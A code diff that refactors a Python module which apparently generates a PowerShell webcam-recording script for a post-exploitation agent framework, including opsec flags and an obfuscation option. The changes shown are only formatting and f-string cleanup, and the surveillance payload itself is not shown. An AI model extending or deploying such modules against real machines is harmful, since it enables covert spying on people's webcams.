@@ -26,7 +26,7 @@ class Module:
 
             # True if the method doesn't touch disk/is reasonably opsec safe
             'OpsecSafe' : False,
-            
+
             'Language' : 'powershell',
 
             'MinLanguageVersion' : '2',
@@ -77,7 +77,7 @@ class Module:
 
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
-        
+
         # the PowerShell script itself, with the command to invoke
         #   for execution appended to the end. Scripts should output
         #   everything to the pipeline for proper parsing.
@@ -205,16 +205,19 @@ Start-WebcamRecorder"""
         # if you're reading in a large, external script that might be updates,
         #   use the pattern below
         # read in the common module source code
-        
+
         # add any arguments to the end execution of the script
         for option,values in self.options.iteritems():
-            if option.lower() != "agent":
-                if values['Value'] and values['Value'] != '':
-                    if values['Value'].lower() == "true":
+            if (
+                option.lower() != "agent"
+                and values['Value']
+                and values['Value'] != ''
+            ):
+                if values['Value'].lower() == "true":
                         # if we're just adding a switch
-                        script += " -" + str(option)
-                    else:
-                        script += " -" + str(option) + " " + str(values['Value'])
+                    script += f" -{str(option)}"
+                else:
+                    script += f" -{str(option)} " + str(values['Value'])
         if obfuscate:
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
         return script
